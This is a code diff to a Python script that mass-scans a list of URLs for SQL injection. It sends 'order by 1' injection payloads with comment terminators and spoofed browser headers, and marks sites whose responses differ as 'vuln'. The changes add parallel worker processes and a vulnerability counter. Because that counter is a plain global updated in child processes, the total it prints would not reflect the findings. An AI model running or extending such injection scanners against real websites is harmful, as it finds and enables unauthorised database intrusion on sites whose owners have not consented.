@@ -30,7 +30,12 @@ two = ["' order by 1 --+"," order by 1 --+"," order by 1 #","' order by 1 #"]
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36', "Upgrade-Insecure-Requests": "1","DNT": "1","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate"}
 error = 0
 vuln = 0
+def starter(now,lock):
+    while(now.value < len(urls)):
+        is_vuln(now,lock)
+
 def is_vuln(now,lock):
+    global vuln
     with lock:
         id = now.value
         now.value += 1
@@ -51,6 +56,7 @@ def is_vuln(now,lock):
         t.sleep(0.5)
         if (res_two == original and res_one != original):
             print(f"{url_target} : is vuln")
+            vuln += 1
     except:
         None
     
@@ -63,14 +69,16 @@ if __name__ == "__main__":
     lock = Lock()
     now = Value('i',0)
     processes = []
-    for _ in urls:
+    print(f"cpu count : {cpu_count()}")
+    for _ in range(cpu_count()):
         try:
-            p = Process(target=is_vuln,args=(now,lock))
+            p = Process(target=starter,args=(now,lock))
             processes.append(p)
             p.start()
         except:
             print("Exception occurred.")
     for p in processes:
         p.join()
+    print(f"Vulns : {vuln}")
     end = t.perf_counter()
     print(f"Finshed in {round(end-start,2)}")
